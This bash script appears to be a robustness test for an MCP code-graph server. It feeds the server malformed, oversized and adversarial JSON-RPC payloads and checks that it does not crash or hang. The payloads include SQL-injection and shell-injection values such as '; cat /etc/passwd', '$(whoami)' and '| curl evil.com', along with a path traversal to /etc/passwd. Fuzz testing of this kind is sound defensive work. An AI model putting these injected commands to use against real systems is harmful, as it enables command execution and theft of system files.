#!/usr/bin/env bash
set -euo pipefail

# Layer 7: MCP robustness test — sends adversarial JSON-RPC payloads via stdio.
#
# Verifies the MCP server handles malformed, oversized, and crafted inputs
# without crashing. Each payload is sent as a complete session (init + payload + EOF).
#
# Usage: scripts/security-fuzz.sh <binary-path>

BINARY="${1:?usage: security-fuzz.sh <binary-path>}"

if [[ ! -f "$BINARY" ]]; then
    echo "FAIL: binary not found: $BINARY"
    exit 1
fi

echo "=== Layer 7: MCP Robustness Test ==="

FAIL=0
PASS=0
TOTAL=0

# Temp directory for input files (avoids pipe/stdin issues with timeout)
FUZZ_TMPDIR=$(mktemp -d)
trap 'rm -rf "$FUZZ_TMPDIR"' EXIT

# Helper: send a payload to the MCP server and check it doesn't crash.
# Uses temp file + perl alarm for portable timeout (works on macOS + Linux).
test_payload() {
    local name="$1"
    local payload="$2"
    TOTAL=$((TOTAL + 1))

    # Write session input to a temp file (avoids pipe/stdin issues)
    local tmpinput="$FUZZ_TMPDIR/input_${TOTAL}.jsonl"
    printf '%s\n%s\n%s\n' \
        '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"fuzz","version":"1.0"}}}' \
        '{"jsonrpc":"2.0","method":"notifications/initialized"}' \
        "$payload" > "$tmpinput"

    # Run with 10s timeout: GNU timeout → perl alarm fallback
    local ec=0
    if command -v timeout &>/dev/null; then
        timeout 10 "$BINARY" < "$tmpinput" > /dev/null 2>&1 || ec=$?
    else
        perl -e 'alarm(10); exec @ARGV' -- "$BINARY" < "$tmpinput" > /dev/null 2>&1 || ec=$?
    fi

    # Acceptable exits:
    #   0   = clean shutdown on EOF
    #   141 = SIGPIPE (pipe closed while writing — normal for stdio MCP)
    #   142 = SIGALRM (perl timeout — hung process, same as GNU timeout 124)
    #   124 = GNU timeout
    if [[ $ec -eq 0 || $ec -eq 141 ]]; then
        PASS=$((PASS + 1))
    elif [[ $ec -eq 124 || $ec -eq 142 ]]; then
        echo "FAIL: $name — timed out (hung for 10s)"
        FAIL=$((FAIL + 1))
    else
        echo "FAIL: $name — crashed with exit code $ec"
        FAIL=$((FAIL + 1))
    fi
}

echo ""
echo "--- Malformed JSON ---"

test_payload "empty line" ""
test_payload "garbage" "not json at all"
test_payload "truncated json" '{"jsonrpc":"2.0","id":2,"met'
test_payload "null byte in json" '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"search_graph","arguments":{"name_pattern":"test\u0000evil"}}}'
test_payload "missing method" '{"jsonrpc":"2.0","id":2}'
test_payload "missing id" '{"jsonrpc":"2.0","method":"tools/call"}'
test_payload "wrong jsonrpc version" '{"jsonrpc":"1.0","id":2,"method":"tools/call","params":{}}'
test_payload "array instead of object" '[1,2,3]'
test_payload "deeply nested json" '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"search_graph","arguments":{"name_pattern":{"a":{"b":{"c":{"d":{"e":{"f":"deep"}}}}}}}}}'

echo ""
echo "--- Oversized inputs ---"

# 1MB string argument
HUGE=$(python3 -c "print('A' * 1048576)" 2>/dev/null || python3.9 -c "print('A' * 1048576)" 2>/dev/null || echo "AAAA")
test_payload "1MB name_pattern" "{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\"params\":{\"name\":\"search_graph\",\"arguments\":{\"name_pattern\":\"$HUGE\"}}}"

# Very long tool name
test_payload "1000-char tool name" "{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\"params\":{\"name\":\"$(python3 -c "print('x' * 1000)" 2>/dev/null || echo 'xxxx')\",\"arguments\":{}}}"

echo ""
echo "--- Tool-specific adversarial inputs ---"

# search_graph with regex that could cause ReDoS
test_payload "ReDoS regex" '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"search_graph","arguments":{"name_pattern":"(a+)+$"}}}'

# query_graph with SQL injection attempts
test_payload "SQL injection in query" '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"query_graph","arguments":{"query":"MATCH (n) RETURN n; DROP TABLE nodes; --"}}}'
test_payload "ATTACH attempt via query" '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"query_graph","arguments":{"query":"ATTACH DATABASE '"'"'/tmp/evil.db'"'"' AS evil"}}}'

# detect_changes with shell metacharacters in base_branch
test_payload "shell injection in base_branch" '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"detect_changes","arguments":{"base_branch":"main'\''$(whoami)'\''","project":"nonexistent"}}}'
test_payload "shell injection semicolon" '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"detect_changes","arguments":{"base_branch":"main; cat /etc/passwd","project":"nonexistent"}}}'
test_payload "shell injection pipe" '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"detect_changes","arguments":{"base_branch":"main | curl evil.com","project":"nonexistent"}}}'

# get_code_snippet with path traversal
test_payload "path traversal in qualified_name" '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"get_code_snippet","arguments":{"qualified_name":"../../../../etc/passwd"}}}'

# search_code with shell metacharacters in file_pattern
test_payload "shell injection in file_pattern" '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"search_code","arguments":{"pattern":"test","file_pattern":"*.py'\'' ; cat /etc/passwd #"}}}'

# index_repository with non-existent path (should return error, not crash)
test_payload "index nonexistent path" '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"index_repository","arguments":{"repo_path":"/nonexistent/path/abc123"}}}'

# Negative/zero values for numeric params
test_payload "negative limit" '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"search_graph","arguments":{"name_pattern":"test","limit":-1}}}'
test_payload "zero max_depth" '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"trace_call_path","arguments":{"function_name":"test","max_depth":0}}}'
test_payload "huge max_rows" '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"query_graph","arguments":{"query":"MATCH (n) RETURN n","max_rows":999999999}}}'

echo ""
echo "--- Results ---"
echo "  $PASS/$TOTAL passed"

if [[ $FAIL -gt 0 ]]; then
    echo "  $FAIL FAILED"
    echo ""
    echo "=== MCP ROBUSTNESS TEST FAILED ==="
    exit 1
fi

echo ""
echo "=== MCP robustness test passed ==="
